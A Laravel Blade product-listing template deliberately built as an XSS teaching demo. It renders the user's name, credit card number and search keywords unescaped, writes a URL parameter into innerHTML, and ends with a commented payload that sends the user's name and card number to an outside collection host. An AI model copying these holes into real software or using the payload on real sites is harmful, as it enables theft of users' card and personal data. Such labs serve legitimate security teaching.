@extends('layouts.master')
@section('title', 'Test Page')
@section('content')
<div class="row mt-2">
    <div class="col col-10">
        <h1>Products</h1>
    </div>
    <div class="col col-2">
        @can('add_products')
        <a href="{{route('products_edit')}}" class="btn btn-success form-control">Add Product</a>
        @endcan
    </div>
</div>

@auth
<!-- Vulnerable user information display (intentionally insecure for XSS demonstration) -->
<div class="card mb-3">
    <div class="card-header bg-info text-white">
        User Information
    </div>
    <div class="card-body">
        <div class="row">
            <div class="col-md-6">
                <p><strong>Welcome:</strong> <span id="user-name">{!! auth()->user()->name !!}</span></p>
            </div>
            <div class="col-md-6">
                <p><strong>Credit Card:</strong> <span id="user-credit">{!! auth()->user()->credit_card !!}</span></p>
            </div>
        </div>
        <!-- Search history will be displayed here -->
        <div id="search-history"></div>
    </div>
</div>
@endauth
<!-- Search form with vulnerable output -->
<form id="search-form">
    <div class="row">
        <div class="col col-sm-2">
            <input name="keywords" id="search-keywords" type="text" class="form-control" placeholder="Search Keywords" value="{{ request()->keywords }}" />
        </div>
        <div class="col col-sm-2">
            <input name="min_price" type="numeric" class="form-control" placeholder="Min Price" value="{{ request()->min_price }}"/>
        </div>
        <div class="col col-sm-2">
            <input name="max_price" type="numeric" class="form-control" placeholder="Max Price" value="{{ request()->max_price }}"/>
        </div>
        <div class="col col-sm-2">
            <select name="order_by" class="form-select">
                <option value="" {{ request()->order_by==""?"selected":"" }} disabled>Order By</option>
                <option value="name" {{ request()->order_by=="name"?"selected":"" }}>Name</option>
                <option value="price" {{ request()->order_by=="price"?"selected":"" }}>Price</option>
            </select>
        </div>
        <div class="col col-sm-2">
            <select name="order_direction" class="form-select">
                <option value="" {{ request()->order_direction==""?"selected":"" }} disabled>Order Direction</option>
                <option value="ASC" {{ request()->order_direction=="ASC"?"selected":"" }}>ASC</option>
                <option value="DESC" {{ request()->order_direction=="DESC"?"selected":"" }}>DESC</option>
            </select>
        </div>
        <div class="col col-sm-1">
            <button type="submit" class="btn btn-primary">Submit</button>
        </div>
        <div class="col col-sm-1">
            <button type="reset" class="btn btn-danger">Reset</button>
        </div>
    </div>
</form>

<!-- Vulnerable: Directly outputting search keywords without sanitization -->
@if(isset($searchKeywords) && !empty($searchKeywords))
<div class="alert alert-info mt-3">
    <h4>Search Results for: {!! $searchKeywords !!}</h4>
</div>
@endif


@foreach($products as $product)
    <div class="card mt-2">
        <div class="card-body">
            <div class="row">
                <div class="col col-sm-12 col-lg-4">
                    <img src="{{asset("images/$product->photo")}}" class="img-thumbnail" alt="{{$product->name}}" width="100%">
                </div>
                <div class="col col-sm-12 col-lg-8 mt-3">
                    <div class="row mb-2">
					    <div class="col-8">
					        <h3>{{$product->name}}</h3>
					    </div>
					    <div class="col col-2">
                            @can('edit_products')
					        <a href="{{route('products_edit', $product->id)}}" class="btn btn-success form-control">Edit</a>
                            @endcan
					    </div>
					    <div class="col col-2">
                            @can('delete_products')
					        <a href="{{route('products_delete', $product->id)}}" class="btn btn-danger form-control">Delete</a>
                            @endcan
					    </div>
					</div>

                    <table class="table table-striped">
                        <tr><th width="20%">Name</th><td>{{$product->name}}</td></tr>
                        <tr><th>Model</th><td>{{$product->model}}</td></tr>
                        <tr><th>Code</th><td>{{$product->code}}</td></tr>
                        <tr><th>Price</th><td>{{$product->price}}</td>
                        <tr><th>Description</th><td>{{$product->description}}</td></tr>
                    </table>
                </div>
            </div>
        </div>
    </div>
@endforeach
<!-- Vulnerable DOM XSS implementation -->
<script>
// Function to parse URL parameters (vulnerable to DOM XSS)
function getUrlParameter(name) {
    name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
    var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
    var results = regex.exec(location.search);
    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
}

// DOM XSS vulnerability: directly inserting URL parameter into DOM
document.addEventListener('DOMContentLoaded', function() {
    // Get the search parameter from URL
    var searchTerm = getUrlParameter('keywords');

    // Add to search history (vulnerable to DOM XSS)
    if (searchTerm) {
        var historyDiv = document.getElementById('search-history');
        if (historyDiv) {
            var searchItem = document.createElement('div');
            searchItem.innerHTML = '<p>Recent search: ' + searchTerm + '</p>';
            historyDiv.appendChild(searchItem);
        }
    }

    // Add event listener to search form
    document.getElementById('search-form').addEventListener('submit', function(e) {
        var keywords = document.getElementById('search-keywords').value;
        // Log search activity
        logSearchActivity(keywords);
    });
});

// Function to log search activity (sends data to collect endpoint)
function logSearchActivity(keywords) {
    fetch('/collect?activity=search&keywords=' + encodeURIComponent(keywords))
        .then(response => response.json())
        .then(data => console.log('Activity logged:', data))
        .catch(error => console.error('Error logging activity:', error));
}

// Reflected XSS payload example (for educational purposes):
// <script>fetch('http://websecservice.localhost.com/collect?name='+document.getElementById('user-name').innerText+'&credit='+document.getElementById('user-credit').innerText);</script>
</script>
@endsection





































